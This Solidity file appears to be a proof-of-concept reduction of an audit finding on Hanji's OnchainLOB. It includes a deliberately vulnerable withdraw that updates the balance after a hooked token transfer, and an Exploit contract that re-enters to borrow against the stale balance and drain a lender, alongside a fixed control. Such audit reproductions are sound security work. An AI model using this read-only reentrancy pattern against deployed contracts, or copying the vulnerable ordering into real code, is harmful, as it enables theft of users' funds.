// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* Hanji OnchainLOB.getTraderBalance (MixBytes, 55173).
   Cheatcode-free reduction. The trader balance is written after the token
   transfer, so a transfer hook still reads the old balance and a lender
   pays against it. The fixed book writes the balance first. */

interface IHook {
    function onLobPayout(uint256 amount) external;
}

interface IBook {
    function getTraderBalance(address trader) external view returns (uint256);
}

contract HookToken {
    string public name = "Hanji";
    string public symbol = "HNJ";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public hook;
    mapping(address => bool) public callbackFrom;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function setHook(address next) external {
        hook = next;
    }

    function setCallbackFrom(address from, bool on) external {
        callbackFrom[from] = on;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        if (callbackFrom[from] && to == hook) {
            IHook(hook).onLobPayout(amount);
        }
    }
}

contract OnchainLOB {
    HookToken public token;
    bool public immutable cei;
    mapping(address => uint256) public balances;

    constructor(HookToken t, bool checksEffects) {
        token = t;
        cei = checksEffects;
    }

    function deposit(uint256 amount) external {
        require(token.transferFrom(msg.sender, address(this), amount), "deposit");
        balances[msg.sender] += amount;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "bal");
        if (cei) {
            balances[msg.sender] -= amount;
        }
        require(token.transfer(msg.sender, amount), "transfer");
        if (!cei) {
            // @> VULN: trader balance is written after the external token transfer
            balances[msg.sender] -= amount;
        }
    }

    function getTraderBalance(address trader) external view returns (uint256) {
        return balances[trader];
    }
}

contract CreditDesk {
    HookToken public token;

    constructor(HookToken t) {
        token = t;
    }

    function borrow(address lob) external returns (uint256 paid) {
        uint256 live = IBook(lob).getTraderBalance(msg.sender);
        uint256 have = token.balanceOf(address(this));
        paid = live <= have ? live : have;
        if (paid > 0) {
            require(token.transfer(msg.sender, paid), "lend");
        }
    }
}

contract Exploit {
    uint256 public constant STAKE = 1000 ether;

    HookToken public token;
    OnchainLOB public lob;
    OnchainLOB public fixedLob;
    CreditDesk public desk;

    address public activeLob;
    bool public armed;
    uint256 public seen;
    uint256 public stolen;
    uint256 public controlSeen;
    uint256 public controlGot;

    constructor() {
        token = new HookToken();
        lob = new OnchainLOB(token, false);
        fixedLob = new OnchainLOB(token, true);
        desk = new CreditDesk(token);
        token.setHook(address(this));
        token.setCallbackFrom(address(lob), true);
        token.setCallbackFrom(address(fixedLob), true);
        token.mint(address(this), STAKE * 2);
        token.mint(address(desk), STAKE);
    }

    function onLobPayout(uint256) external {
        require(msg.sender == address(token), "hook");
        if (!armed) return;
        armed = false;
        uint256 stale = IBook(activeLob).getTraderBalance(address(this));
        uint256 got = desk.borrow(activeLob);
        if (activeLob == address(lob)) {
            seen = stale;
            stolen = got;
        } else {
            controlSeen = stale;
            controlGot = got;
        }
    }

    function run() external {
        token.approve(address(lob), STAKE);
        lob.deposit(STAKE);
        token.approve(address(fixedLob), STAKE);
        fixedLob.deposit(STAKE);
        activeLob = address(lob);
        armed = true;
        lob.withdraw(STAKE);
        require(seen == STAKE, "stale view");
        require(stolen == STAKE, "lender paid stale balance");
        activeLob = address(fixedLob);
        armed = true;
        fixedLob.withdraw(STAKE);
        require(controlSeen == 0, "fixed view");
        require(controlGot == 0, "fixed paid");
        require(token.balanceOf(address(this)) == STAKE * 3, "profit");
        require(token.balanceOf(address(desk)) == 0, "desk drained");
    }
}
